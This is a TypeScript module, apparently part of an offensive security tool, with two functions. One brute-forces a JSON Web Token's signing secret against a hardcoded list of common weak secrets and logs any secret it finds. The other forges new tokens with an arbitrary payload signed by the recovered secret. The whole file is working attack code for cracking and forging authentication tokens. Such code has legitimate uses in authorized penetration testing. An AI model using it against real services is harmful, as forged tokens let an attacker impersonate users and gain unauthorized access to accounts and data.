import { createSubsystemLogger } from "../logging/subsystem.js";
import { sign, decode } from "jsonwebtoken";

const log = createSubsystemLogger("tools/jwt");

const COMMON_SECRETS = [
    "123456", "password", "secret", "default", "admin", "dev",
    "jwt-secret", "supersecret", "changeit", "root", "guest",
    "access", "testing", "development", "production", "app",
    "k3y", "flutter", "fbh"
];

export async function bruteForceJwt(token: string): Promise<string | null> {
    log.info(`Brute-forcing JWT token...`);

    for (const secret of COMMON_SECRETS) {
        try {
            // Attempt to decode with secret
            decode(token, { json: true }); // Verify format first
            // Note: jsonwebtoken library's verify is sync
            const verified = await new Promise((resolve) => {
                import("jsonwebtoken").then(jwt => {
                    try {
                        jwt.verify(token, secret);
                        resolve(true);
                    } catch {
                        resolve(false);
                    }
                });
            });

            if (verified) {
                log.info(`SUCCESS: Discovered weak JWT secret: ${secret}`);
                return secret;
            }
        } catch (err) {
            continue;
        }
    }

    return null;
}

export function forgeJwt(payload: any, secret: string, alg: any = "HS256"): string {
    log.info(`Forging new JWT token with secret: ${secret}`);
    return sign(payload, secret, { algorithm: alg });
}
